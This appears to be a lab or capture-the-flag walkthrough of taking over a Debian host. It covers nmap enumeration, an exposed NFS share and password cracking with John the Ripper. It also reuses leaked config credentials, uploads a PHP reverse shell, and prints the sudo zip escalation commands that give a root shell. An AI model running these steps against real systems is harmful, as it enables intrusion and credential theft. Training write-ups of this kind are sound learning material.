# Scanning & Enumeration

## Nmap

Scan active hosts on the subnet:
![[Pasted image 20240307100746.png]]

Nmap all ports:
```bash
# Nmap 7.94SVN scan initiated Thu Mar  7 10:08:53 2024 as: nmap -p- -oN dev_all.nmap 10.0.0.15
Nmap scan report for 10.0.0.15
Host is up (0.00055s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
8080/tcp  open  http-proxy
42633/tcp open  unknown
43983/tcp open  unknown
53367/tcp open  unknown
56559/tcp open  unknown

# Nmap done at Thu Mar  7 10:08:58 2024 -- 1 IP address (1 host up) scanned in 4.97 seconds
```

Nmap open ports:
```bash
# Nmap 7.94SVN scan initiated Thu Mar  7 10:10:11 2024 as: nmap -p 22,80,111,2049,8080,42633,43983,53367,56559 -sV -sC -oN dev_open.nmap 10.0.0.15
Nmap scan report for 10.0.0.15
Host is up (0.00044s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35323/udp   mountd
|   100005  1,2,3      39409/tcp6  mountd
|   100005  1,2,3      43983/tcp   mountd
|   100005  1,2,3      52065/udp6  mountd
|   100021  1,3,4      38599/tcp6  nlockmgr
|   100021  1,3,4      42633/tcp   nlockmgr
|   100021  1,3,4      50841/udp6  nlockmgr
|   100021  1,3,4      52663/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
42633/tcp open  nlockmgr 1-4 (RPC #100021)
43983/tcp open  mountd   1-3 (RPC #100005)
53367/tcp open  mountd   1-3 (RPC #100005)
56559/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  7 10:10:18 2024 -- 1 IP address (1 host up) scanned in 7.30 seconds
```

## HTTP

Port 80:
![[Pasted image 20240307103425.png]]

Enumerate directories on port 80:
![[Pasted image 20240307113522.png]]


Port 8080:
![[Pasted image 20240307103406.png]]

![[Pasted image 20240307124446.png]]

Enumerate /dev:
![[Pasted image 20240307125848.png]]
## NFS

>[!Info]
>Network File System (NFS) is a distributed file system protocol that allows you to share remote directories over a network. With NFS, you can mount remote directories on your system and work with the remote files as if they were local files.
>
>On Linux and UNIX operating systems, you can use the `mount` command to mount a shared NFS directory on a particular mount point in the local directory tree.

With `showmount` we can show info from the NFS server. From manpage:
`showmount - show mount information for an NFS server`

Create directory *nfs_mnt* and mount the nfs root file system:
```bash
sudo mount -t nfs 10.0.0.15:/ nfs_mnt
```
In the directory *nfs_mnt/srv/nfs* is a file named *save.zip*.
Unfortunately the zip file is password protected:
![[Pasted image 20240307110454.png]]

# Exploitation

Crack zip file password with John the Ripper.
We first need to copy the file from the NFS to our local file system.
Create a hash file of our password protected zip file:
```bash
zip2john save.zip > hash.txt
```
![[Pasted image 20240307111015.png]]
Then crack the hashes:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Success:
![[Pasted image 20240307111139.png]]
=> PW: java101

Now we are able to unzip the file with the password "java101":
![[Pasted image 20240307111223.png]]

todo.txt:
![[Pasted image 20240307111602.png]]

Try to connect to SSH with private rsa key as user *jp*:
![[Pasted image 20240307111628.png]]
Unfortunately jp has a private key password.

Brute force private key password with john.
First convert the private key to a hashable format:
```bash
ssh2john id_rsa > id_rsa.hash
```

![[Pasted image 20240307112303.png]]

Crack password:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
Unsuccessful..

## HTTP

Download the directory */app* on port 80:
```bash
wget -r -np -R "index.html*" http://10.0.0.15/app/
```
Args:
`-r`: recursive
`-np`: no parents (don't go upwards)
`-R "index.html*"`: reject/avoid downloading the auto-generated *index.html* files

The config file */app/config/config.yml* contains:
Database credentials:
```yaml
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```
Allowed formats for file upload:
```yaml
# Define the file types (extensions to be exact) that are acceptable for upload
# in either 'file' fields or through the 'files' screen. Note that certain file-
# types are never acceptable, even if they are in this list. These types are
# never allowed: sh, asp, cgi, php, php3, ph3, php4, ph4, php5, ph5, phtm, phtml
accept_file_types: [ twig, html, js, css, scss, gif, jpg, jpeg, png, ico, zip, tgz, txt, md, doc, docx, pdf, epub, xls, xlsx, ppt, pptx, mp3, ogg, wav, m4a, mp4, m4v, ogv, wmv, avi, webm, svg]
```

Navigate /dev on port 8080:
![[Pasted image 20240307124543.png]]

If the page from GET parameter *p* does not exist, we are able to create the page:
![[Pasted image 20240307130012.png]]

We are going to use a PHP one liner reverse shell from: https://gist.github.com/rshipp/eee36684db07d234c1cc
![[Pasted image 20240307130212.png]]

Navigating to dev/pages/ shows us the available pages:
![[Pasted image 20240307130240.png]]

Upon navigating to *revshell.php* we should get a reverse shell on our netcat listener:
![[Pasted image 20240307130349.png]]

Listing the /home folder we see that there is the user *jeanpaul* on the system:
![[Pasted image 20240307130810.png]]

Try to connect to SSH as "jeanpaul":
The password "I_love_java" from */app/config/config.yml* works!
![[Pasted image 20240307130640.png]]
SSH with id_rsa
User: jeanpaul
PW: I_love_java

## Privesc

Listing the contents of .bash_history shows that it got deleted almost fully :)
But we get a hint with "sudo -l". If we execute that command, we can see that jeanpaul can run */usr/bin/zip* as root user:
![[Pasted image 20240307131028.png]]

https://gtfobins.github.io/gtfobins/zip/
Create a file *privesc.sh* and add the lines from the gtfobins url:
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Make the file executable and enjoy the root shell :)
![[Pasted image 20240307131615.png]]

# Official solution

There is also a file inclusion vulnerability:
![[Pasted image 20240307133844.png]]

zip privesc. root flag:
![[Pasted image 20240307134258.png]]